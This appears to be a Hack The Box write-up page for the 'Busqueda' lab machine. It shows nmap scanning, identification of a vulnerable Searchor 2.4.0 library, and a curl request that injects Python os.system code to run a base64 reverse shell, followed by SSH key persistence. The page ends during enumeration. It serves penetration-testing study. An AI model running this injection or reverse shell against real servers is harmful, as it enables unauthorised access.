@@ -1,0 +1,1255 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Linux box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;busqueda#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Busqueda<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-04-10</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#host-10-10-11-208">Host 10.10.11.208</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#apache">Apache</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#foothold-python-command-injection">Foothold (Python command injection)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#preparation">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#spawning-a-pty-establishing-persistence">Spawning a pty &amp; establishing persistence</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#distribution">Distribution</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#kernel">Kernel</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#nics">NICs</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#hostname">Hostname</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#flags">Flags</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#home-folders">Home folders</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#website-code-review">Website code review</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#services-enumeration-1">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#apache-1">Apache</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#system-enumeration-1">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#sudo-permissions">Sudo permissions</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#exploring-opt-scripts">Exploring &#x2F;opt&#x2F;scripts</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#inspecting-opt-scripts-system-checkup-py">Inspecting &#x2F;opt&#x2F;scripts&#x2F;system-checkup.py</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#host-172-19-0-2">Host 172.19.0.2</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#services-enumeration-2">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#mysql">MySQL</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#host-10-10-11-208-1">Host 10.10.11.208</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#services-enumeration-3">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#apache-2">Apache</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#preparation-1">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#exploitation-1">Exploitation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#establishing-persistence">Establishing persistence</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#system-enumeration-2">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#flags-1">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Linux</p>
+<p><strong>Release date</strong>: 2023-04-08</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/389926">kavigihan</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.10</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-11-208">Host <code>10.10.11.208</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Busqueda using a TCP SYN
+<code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.208<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.208<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE         SERVICE
+</span><span class="z-text z-plain">68/udp open|filtered dhcpc
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the services associated
+with the open TCP ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.208<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
+</span><span class="z-text z-plain">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+</span><span class="z-text z-plain">80/tcp open  http    Apache httpd 2.4.52
+</span><span class="z-text z-plain">Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's do the same for the UDP port.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.208<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>68<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE         SERVICE VERSION
+</span><span class="z-text z-plain">68/udp open|filtered dhcpc
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Busqueda is running Linux, and the
+version of SSH suggests that it might be Ubuntu. It also found that its hostname
+is <code>searcher.htb</code>.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.208<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
+</span><span class="z-text z-plain">|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: Did not follow redirect to http://searcher.htb/
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also run them on the UDP service.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.208<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>68<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE         SERVICE
+</span><span class="z-text z-plain">68/udp open|filtered dhcpc
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>http-title</code> script indicates that the Apache server redirects to
+<code>http://searcher.htb/</code>. I'll add it to my <code>/etc/hosts</code> file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.208 searcher.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/hosts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Now I'll run <code>nmap</code>'s default scripts on the web server once again.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>searcher.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: Searcher
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="apache">Apache</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>http://searcher.htb/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/domain-homepage.png" alt="Domain homepage" /></p>
+<p>Apparently, it's a website used to search keywords across social medias and the
+web.</p>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/domain-homepage-wappalyzer.png" alt="Domain homepage Wappalyzer extension" /></p>
+<p>This reveals that this web page is using Flask.</p>
+<p>If we check the HTTP headers of the response, we also find a <code>Server</code> header
+indicating that the server is using the Werkzeug library <code>2.1.2</code> for Python
+<code>3.10.6</code>.</p>
+<p>Interestingly, the footer of the website leaks that it's using
+<a href="https://github.com/ArjunSharda/Searchor">Searchor</a> version <code>2.4.0</code>.</p>
+<blockquote>
+<p>Searchor is an all-in-one PyPi Python Library that simplifies web scraping,
+obtaining information on an topic, and generating search query URLs.</p>
+<p>— <a href="https://github.com/ArjunSharda/Searchor">GitHub</a></p>
+</blockquote>
+<h4 id="exploration-1">Exploration</h4>
+<p>We're given a form, which we can fill with a selection of engines, and with
+keywords to search for. We also have the possibility of ticking a checkbox to
+get redirected to the result instead of just getting the URL.</p>
+<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
+<p>Before trying to mess with the form we have, let's check the <a href="https://github.com/ArjunSharda/Searchor">GitHub page of
+Searchor</a>.</p>
+<p>We know it's using version <code>2.4.0</code>. If we check the
+<a href="https://github.com/ArjunSharda/Searchor/releases">releases</a> notes for each
+version, we see that the version <code>2.4.2</code> 'Patched a priority vulnerability in
+the Searchor CLI', and links to
+<a href="https://github.com/ArjunSharda/Searchor/pull/130">this pull request</a>.</p>
+<p>If we read it, we see that it actually fixes a RCE vulnerability!</p>
+<h2 id="foothold-python-command-injection">Foothold (Python command injection)</h2>
+<p>Searchor versions prior to <code>2.4.2</code> are affected by a RCE. The vulnerability
+stems from the <code>eval</code> function call used on user-supplied inputs in the search
+functionality, the core of the library. Therefore, an attacker can enter
+specific inputs to execute commands on the server.</p>
+<h3 id="preparation">Preparation</h3>
+<p>The goal is to obtain a reverse shell.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
+<a href="https://www.revshells.com/">RevShells</a> configured to obtain a <code>/bin/bash</code>
+shell.</p>
+<p>I'll save it as the <code>BASE64_REVSHELL_PAYLOAD</code> shell variable.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Let's send a request to Busqueda to execute our payload.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://searcher.htb/search<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>engine=Accuweather<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>query=&#39;,__import__(&#39;os&#39;).system(&#39;/bin/echo <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">BASE64_REVSHELL_PAYLOAD</span></span> | /usr/bin/base64 -d | /bin/bash -i&#39;))#<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>If we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 42738
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">svc@busqueda:/var/www/app$
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<h3 id="spawning-a-pty-establishing-persistence">Spawning a pty &amp; establishing persistence</h3>
+<p>Let's use SSH to spawn a pty and to establish persistence.</p>
+<p>Our home folder doesn't contain a <code>.ssh</code> folder, so I'll create one. Then I'll
+create a private key, and I'll add the corresponding public key to
+<code>authorized_keys</code>. Finally, I'll connect over SSH to Busqueda as <code>svc</code>.</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>svc</code>.</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Busqueda's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>It's using x86_64. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="distribution">Distribution</h3>
+<p>Let's see which distribution Busqueda is using.</p>
